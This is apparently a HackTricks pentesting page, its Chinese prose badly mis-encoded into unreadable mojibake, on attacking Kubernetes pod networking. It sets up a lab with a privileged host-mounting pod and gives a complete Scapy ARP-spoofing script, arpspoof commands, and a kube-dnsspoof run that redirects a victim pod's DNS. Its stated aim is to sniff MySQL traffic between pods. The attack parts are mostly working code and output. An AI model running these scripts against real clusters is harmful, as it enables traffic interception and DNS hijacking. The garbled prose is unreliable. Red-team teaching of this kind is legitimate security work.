# Kubernetesç½‘ç»œæ”»å‡»

{% hint style="success" %}
å­¦ä¹ å¹¶ç»ƒä¹ AWS Hackingï¼š<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶ï¼ˆARTEï¼‰**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å¹¶ç»ƒä¹ GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶ï¼ˆGRTEï¼‰**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒHackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **githubä»“åº“æäº¤PRæ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚**

</details>
{% endhint %}

## ç®€ä»‹

åœ¨Kubernetesä¸­ï¼Œè§‚å¯Ÿåˆ°é»˜è®¤è¡Œä¸ºå…è®¸**åŒä¸€èŠ‚ç‚¹ä¸Šæ‰€æœ‰å®¹å™¨ä¹‹é—´å»ºç«‹è¿æ¥**ã€‚è¿™é€‚ç”¨äºä¸è€ƒè™‘å‘½åç©ºé—´çš„åŒºåˆ«ã€‚è¿™ç§è¿æ¥æ€§å»¶ä¼¸åˆ°**ç¬¬2å±‚**ï¼ˆä»¥å¤ªç½‘ï¼‰ã€‚å› æ­¤ï¼Œè¿™ç§é…ç½®å¯èƒ½ä¼šä½¿ç³»ç»Ÿæš´éœ²äºæ¼æ´ä¹‹ä¸­ã€‚å…·ä½“è€Œè¨€ï¼Œå®ƒä¸º**æ¶æ„å®¹å™¨**æ‰“å¼€äº†ä¸€ä¸ªå¯èƒ½æ‰§è¡Œ**ARPæ¬ºéª—æ”»å‡»**çš„å¯èƒ½æ€§ï¼Œè€Œè¿™äº›å®¹å™¨ä½äºåŒä¸€èŠ‚ç‚¹ä¸Šã€‚åœ¨è¿™ç§æ”»å‡»ä¸­ï¼Œæ¶æ„å®¹å™¨å¯ä»¥æ¬ºéª—æ€§åœ°æ‹¦æˆªæˆ–ä¿®æ”¹ä¸ºå…¶ä»–å®¹å™¨è€Œè®¾è®¡çš„ç½‘ç»œæµé‡ã€‚

ARPæ¬ºéª—æ”»å‡»æ¶‰åŠ**æ”»å‡»è€…åœ¨æœ¬åœ°åŒºåŸŸç½‘ç»œä¸Šå‘é€ä¼ªé€ çš„ARP**ï¼ˆåœ°å€è§£æåè®®ï¼‰æ¶ˆæ¯ã€‚è¿™å¯¼è‡´**æ”»å‡»è€…çš„MACåœ°å€ä¸ç½‘ç»œä¸Šåˆæ³•è®¡ç®—æœºæˆ–æœåŠ¡å™¨çš„IPåœ°å€**å…³è”èµ·æ¥ã€‚åœ¨æˆåŠŸæ‰§è¡Œè¿™ç§æ”»å‡»åï¼Œæ”»å‡»è€…å¯ä»¥æ‹¦æˆªã€ä¿®æ”¹ç”šè‡³åœæ­¢ä¼ è¾“ä¸­çš„æ•°æ®ã€‚è¿™ç§æ”»å‡»åœ¨OSIæ¨¡å‹çš„ç¬¬2å±‚æ‰§è¡Œï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆKubernetesåœ¨è¿™ä¸€å±‚çš„é»˜è®¤è¿æ¥æ€§å¼•å‘å®‰å…¨æ‹…å¿§ã€‚

åœ¨è¿™ç§æƒ…å†µä¸‹å°†åˆ›å»º4å°æœºå™¨ï¼š

* ubuntu-peï¼šç‰¹æƒæœºå™¨ï¼Œç”¨äºé€ƒé€¸åˆ°èŠ‚ç‚¹å¹¶æ£€æŸ¥æŒ‡æ ‡ï¼ˆæ”»å‡»ä¸éœ€è¦ï¼‰
* **ubuntu-attack**ï¼šé»˜è®¤å‘½åç©ºé—´ä¸­çš„**æ¶æ„**å®¹å™¨
* **ubuntu-victim**ï¼škube-systemå‘½åç©ºé—´ä¸­çš„**å—å®³è€…**æœºå™¨
* **mysql**ï¼šé»˜è®¤å‘½åç©ºé—´ä¸­çš„**å—å®³è€…**æœºå™¨
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
name: ubuntu-pe
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-pe
securityContext:
allowPrivilegeEscalation: true
privileged: true
runAsUser: 0
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never
hostIPC: true
hostNetwork: true
hostPID: true
volumes:
- name: host-volume
hostPath:
path: /
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-attack
labels:
app: ubuntu
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-attack
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-victim
namespace: kube-system
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-victim
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: mysql
spec:
containers:
- image: mysql:5.6
ports:
- containerPort: 3306
imagePullPolicy: IfNotPresent
name: mysql
env:
- name: MYSQL_ROOT_PASSWORD
value: mysql
restartPolicy: Never' | kubectl apply -f -
```

```bash
kubectl exec -it ubuntu-attack -- bash -c "apt update; apt install -y net-tools python3-pip python3 ngrep nano dnsutils; pip3 install scapy; bash"
kubectl exec -it ubuntu-victim -n kube-system -- bash -c "apt update; apt install -y net-tools curl netcat mysql-client; bash"
kubectl exec -it mysql bash -- bash -c "apt update; apt install -y net-tools; bash"
```
## KubernetesåŸºç¡€ç½‘ç»œ

å¦‚æœæ‚¨æƒ³äº†è§£è¿™é‡Œä»‹ç»çš„ç½‘ç»œä¸»é¢˜çš„æ›´å¤šç»†èŠ‚ï¼Œè¯·å‚è€ƒå‚è€ƒèµ„æ–™ã€‚

### ARP

ä¸€èˆ¬æ¥è¯´ï¼Œ**èŠ‚ç‚¹å†…éƒ¨çš„Podåˆ°Podç½‘ç»œ**æ˜¯é€šè¿‡ä¸€ä¸ªè¿æ¥æ‰€æœ‰Podçš„**æ¡¥æ¥å™¨**å®ç°çš„ã€‚è¿™ä¸ªæ¡¥æ¥å™¨è¢«ç§°ä¸ºâ€œ**cbr0**â€ï¼ˆæŸäº›ç½‘ç»œæ’ä»¶ä¼šå®‰è£…å®ƒä»¬è‡ªå·±çš„æ¡¥æ¥å™¨ï¼‰ã€‚**cbr0ä¹Ÿå¯ä»¥å¤„ç†ARP**ï¼ˆåœ°å€è§£æåè®®ï¼‰è§£æã€‚å½“ä¸€ä¸ªä¼ å…¥çš„æ•°æ®åŒ…åˆ°è¾¾cbr0æ—¶ï¼Œå®ƒå¯ä»¥ä½¿ç”¨ARPè§£æç›®æ ‡MACåœ°å€ã€‚

è¿™ä¸ªäº‹å®æ„å‘³ç€ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œ**åœ¨åŒä¸€èŠ‚ç‚¹ä¸Šè¿è¡Œçš„æ¯ä¸ªPod**éƒ½å¯ä»¥ä¸åŒä¸€èŠ‚ç‚¹ä¸­çš„ä»»ä½•å…¶ä»–Podï¼ˆä¸å‘½åç©ºé—´æ— å…³ï¼‰è¿›è¡Œä»¥å¤ªç½‘çº§åˆ«ï¼ˆç¬¬2å±‚ï¼‰çš„**é€šä¿¡**ã€‚

{% hint style="warning" %}
å› æ­¤ï¼Œå¯ä»¥åœ¨åŒä¸€èŠ‚ç‚¹ä¸­çš„Podä¹‹é—´æ‰§è¡Œ**ARPæ¬ºéª—æ”»å‡»**ã€‚
{% endhint %}

### DNS

åœ¨Kubernetesç¯å¢ƒä¸­ï¼Œé€šå¸¸ä¼šå‘ç°è¿è¡Œç€1ä¸ªï¼ˆæˆ–å¤šä¸ªï¼‰**DNSæœåŠ¡**ï¼Œé€šå¸¸ä½äºkube-systemå‘½åç©ºé—´ä¸­ï¼š
```bash
kubectl -n kube-system describe services
Name:              kube-dns
Namespace:         kube-system
Labels:            k8s-app=kube-dns
kubernetes.io/cluster-service=true
kubernetes.io/name=KubeDNS
Annotations:       prometheus.io/port: 9153
prometheus.io/scrape: true
Selector:          k8s-app=kube-dns
Type:              ClusterIP
IP Families:       <none>
IP:                10.96.0.10
IPs:               10.96.0.10
Port:              dns  53/UDP
TargetPort:        53/UDP
Endpoints:         172.17.0.2:53
Port:              dns-tcp  53/TCP
TargetPort:        53/TCP
Endpoints:         172.17.0.2:53
Port:              metrics  9153/TCP
TargetPort:        9153/TCP
Endpoints:         172.17.0.2:9153
```
åœ¨å…ˆå‰çš„ä¿¡æ¯ä¸­ï¼Œä½ å¯ä»¥çœ‹åˆ°ä¸€äº›æœ‰è¶£çš„å†…å®¹ï¼Œ**æœåŠ¡çš„IP**æ˜¯**10.96.0.10**ï¼Œä½†è¿è¡ŒæœåŠ¡çš„**Podçš„IP**æ˜¯**172.17.0.2**ã€‚

å¦‚æœä½ æ£€æŸ¥ä»»ä½•Podå†…éƒ¨çš„DNSåœ°å€ï¼Œä½ ä¼šå‘ç°ç±»ä¼¼è¿™æ ·çš„å†…å®¹ï¼š
```
cat /etc/resolv.conf
nameserver 10.96.0.10
```
ç„¶è€Œï¼Œè¯¥**podä¸çŸ¥é“**å¦‚ä½•åˆ°è¾¾è¯¥**åœ°å€**ï¼Œå› ä¸ºåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ**podèŒƒå›´**ä¸º172.17.0.10/26ã€‚

å› æ­¤ï¼Œè¯¥podå°†å‘åœ°å€10.96.0.10å‘é€**DNSè¯·æ±‚**ï¼Œè¯¥åœ°å€å°†ç”±cbr0**è½¬æ¢ä¸º**172.17.0.2ã€‚

{% hint style="warning" %}
è¿™æ„å‘³ç€podçš„**DNSè¯·æ±‚**å°†å§‹ç»ˆç»è¿‡**æ¡¥æ¥**è½¬æ¢**æœåŠ¡IPä¸ºç«¯ç‚¹IP**ï¼Œå³ä½¿DNSæœåŠ¡å™¨ä½äºä¸podç›¸åŒçš„å­ç½‘ä¸­ã€‚

äº†è§£åˆ°è¿™ä¸€ç‚¹ï¼Œå¹¶ä¸”çŸ¥é“**ARPæ”»å‡»æ˜¯å¯èƒ½çš„**ï¼ŒèŠ‚ç‚¹ä¸­çš„**pod**å°†èƒ½å¤Ÿ**æ‹¦æˆª**å­ç½‘ä¸­**æ¯ä¸ªpod**ä¸**æ¡¥æ¥**ä¹‹é—´çš„æµé‡ï¼Œå¹¶**ä¿®æ”¹**æ¥è‡ªDNSæœåŠ¡å™¨çš„**DNSå“åº”**ï¼ˆ**DNSæ¬ºéª—**ï¼‰ã€‚

æ­¤å¤–ï¼Œå¦‚æœ**DNSæœåŠ¡å™¨**ä½äº**æ”»å‡»è€…ç›¸åŒçš„èŠ‚ç‚¹**ä¸Šï¼Œæ”»å‡»è€…å¯ä»¥**æ‹¦æˆªé›†ç¾¤ä¸­ä»»ä½•pod**çš„æ‰€æœ‰DNSè¯·æ±‚ï¼ˆä½äºDNSæœåŠ¡å™¨å’Œæ¡¥æ¥ä¹‹é—´ï¼‰å¹¶ä¿®æ”¹å“åº”ã€‚
{% endhint %}

## åœ¨ç›¸åŒèŠ‚ç‚¹ä¸­çš„podä¸­è¿›è¡ŒARPæ¬ºéª—

æˆ‘ä»¬çš„ç›®æ ‡æ˜¯**è‡³å°‘çªƒå–ä»ubuntu-victimåˆ°mysqlçš„é€šä¿¡**ã€‚

### Scapy
```bash
python3 /tmp/arp_spoof.py
Enter Target IP:172.17.0.10 #ubuntu-victim
Enter Gateway IP:172.17.0.9 #mysql
Target MAC 02:42:ac:11:00:0a
Gateway MAC: 02:42:ac:11:00:09
Sending spoofed ARP responses

# Get another shell
kubectl exec -it ubuntu-attack -- bash
ngrep -d eth0

# Login from ubuntu-victim and mysql and check the unencrypted communication
# interacting with the mysql instance
```
{% code title="arp_spoof.py" %}
```python
#From https://gist.github.com/rbn15/bc054f9a84489dbdfc35d333e3d63c87#file-arpspoofer-py
from scapy.all import *

def getmac(targetip):
arppacket= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
targetmac= srp(arppacket, timeout=2 , verbose= False)[0][0][1].hwsrc
return targetmac

def spoofarpcache(targetip, targetmac, sourceip):
spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
send(spoofed, verbose= False)

def restorearp(targetip, targetmac, sourceip, sourcemac):
packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
send(packet, verbose=False)
print("ARP Table restored to normal for", targetip)

def main():
targetip= input("Enter Target IP:")
gatewayip= input("Enter Gateway IP:")

try:
targetmac= getmac(targetip)
print("Target MAC", targetmac)
except:
print("Target machine did not respond to ARP broadcast")
quit()

try:
gatewaymac= getmac(gatewayip)
print("Gateway MAC:", gatewaymac)
except:
print("Gateway is unreachable")
quit()
try:
print("Sending spoofed ARP responses")
while True:
spoofarpcache(targetip, targetmac, gatewayip)
spoofarpcache(gatewayip, gatewaymac, targetip)
except KeyboardInterrupt:
print("ARP spoofing stopped")
restorearp(gatewayip, gatewaymac, targetip, targetmac)
restorearp(targetip, targetmac, gatewayip, gatewaymac)
quit()

if __name__=="__main__":
main()

# To enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward
```
{% endcode %}

### ARPSpoof
```bash
apt install dsniff
arpspoof -t 172.17.0.9 172.17.0.10
```
## DNSæ¬ºéª—

æ­£å¦‚å‰é¢æåˆ°çš„ï¼Œå¦‚æœæ‚¨**å…¥ä¾µäº†ä¸DNSæœåŠ¡å™¨podç›¸åŒèŠ‚ç‚¹ä¸­çš„ä¸€ä¸ªpod**ï¼Œæ‚¨å¯ä»¥é€šè¿‡**ARPæ¬ºéª—****æ¡¥æ¥å’ŒDNS** podè¿›è¡Œ**ä¸­é—´äººæ”»å‡»**ï¼Œå¹¶**ä¿®æ”¹æ‰€æœ‰DNSå“åº”**ã€‚

æ‚¨å¯ä»¥åœ¨[**https://github.com/danielsagi/kube-dnsspoof/**](https://github.com/danielsagi/kube-dnsspoof/)æ‰¾åˆ°ä¸€ä¸ªéå¸¸å¥½çš„**å·¥å…·**å’Œ**æ•™ç¨‹**æ¥æµ‹è¯•è¿™ä¸€ç‚¹ã€‚

åœ¨æˆ‘ä»¬çš„åœºæ™¯ä¸­ï¼Œ**åœ¨æ”»å‡»è€…podä¸­ä¸‹è½½**è¿™ä¸ª**å·¥å…·**ï¼Œå¹¶åˆ›å»ºä¸€ä¸ªåä¸º`hosts`çš„æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æ‚¨æƒ³è¦**æ¬ºéª—**çš„**åŸŸå**ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š
```
cat hosts
google.com. 1.1.1.1
```
å¯¹ubuntu-victimæœºå™¨æ‰§è¡Œæ”»å‡»ï¼š
```
python3 exploit.py --direct 172.17.0.10
[*] starting attack on direct mode to pod 172.17.0.10
Bridge:  172.17.0.1 02:42:bd:63:07:8d
Kube-dns:  172.17.0.2 02:42:ac:11:00:02

[+] Taking over DNS requests from kube-dns. press Ctrl+C to stop
```

```bash
#In the ubuntu machine
dig google.com
[...]
;; ANSWER SECTION:
google.com.		1	IN	A	1.1.1.1
```
{% hint style="info" %}
å¦‚æœæ‚¨å°è¯•åˆ›å»ºè‡ªå·±çš„DNSæ¬ºéª—è„šæœ¬ï¼Œ**ä»…ä¿®æ”¹DNSå“åº”**æ˜¯**ä¸ä¼š**èµ·ä½œç”¨çš„ï¼Œå› ä¸º**å“åº”**å°†å…·æœ‰**æ¶æ„** **pod**çš„IPåœ°å€ä½œä¸º**æºIP**ï¼Œå¹¶ä¸”å°†**ä¸ä¼š**è¢«**æ¥å—**ã€‚\
æ‚¨éœ€è¦ç”Ÿæˆä¸€ä¸ªå¸¦æœ‰å—å®³è€…å‘é€DNSè¯·æ±‚çš„DNSçš„**æºIP**çš„**æ–°DNSæ•°æ®åŒ…**ï¼ˆç±»ä¼¼äº172.16.0.2ï¼Œè€Œä¸æ˜¯10.96.0.10ï¼Œé‚£æ˜¯K8s DNSæœåŠ¡IPï¼Œè€Œä¸æ˜¯DNSæœåŠ¡å™¨IPï¼Œæœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…ä»‹ç»éƒ¨åˆ†ï¼‰ã€‚
{% endhint %}

## æ•è·æµé‡

å·¥å…·[Mizu](https://github.com/up9inc/mizu)æ˜¯ä¸€ä¸ªç®€å•ä½†åŠŸèƒ½å¼ºå¤§çš„ç”¨äºKubernetesçš„API **æµé‡æŸ¥çœ‹å™¨**ï¼Œä½¿æ‚¨èƒ½å¤ŸæŸ¥çœ‹å¾®æœåŠ¡ä¹‹é—´çš„æ‰€æœ‰APIé€šä¿¡ï¼Œä»¥å¸®åŠ©æ‚¨è°ƒè¯•å’Œæ’é™¤å›å½’é—®é¢˜ã€‚\
å®ƒå°†åœ¨æ‰€é€‰çš„podä¸­å®‰è£…ä»£ç†å¹¶æ”¶é›†å…¶æµé‡ä¿¡æ¯ï¼Œå¹¶åœ¨WebæœåŠ¡å™¨ä¸­æ˜¾ç¤ºç»™æ‚¨ã€‚ä½†æ˜¯ï¼Œæ‚¨éœ€è¦é«˜çº§K8sæƒé™æ‰èƒ½ä½¿ç”¨æ­¤å·¥å…·ï¼ˆè€Œä¸”ä¸å¤ªéšè”½ï¼‰ã€‚

## å‚è€ƒèµ„æ–™

* [https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1](https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1)
* [https://blog.aquasec.com/dns-spoofing-kubernetes-clusters](https://blog.aquasec.com/dns-spoofing-kubernetes-clusters)

{% hint style="success" %}
å­¦ä¹ å¹¶ç»ƒä¹ AWS Hackingï¼š<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å¹¶ç»ƒä¹ GCP Hackingï¼š<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒHackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
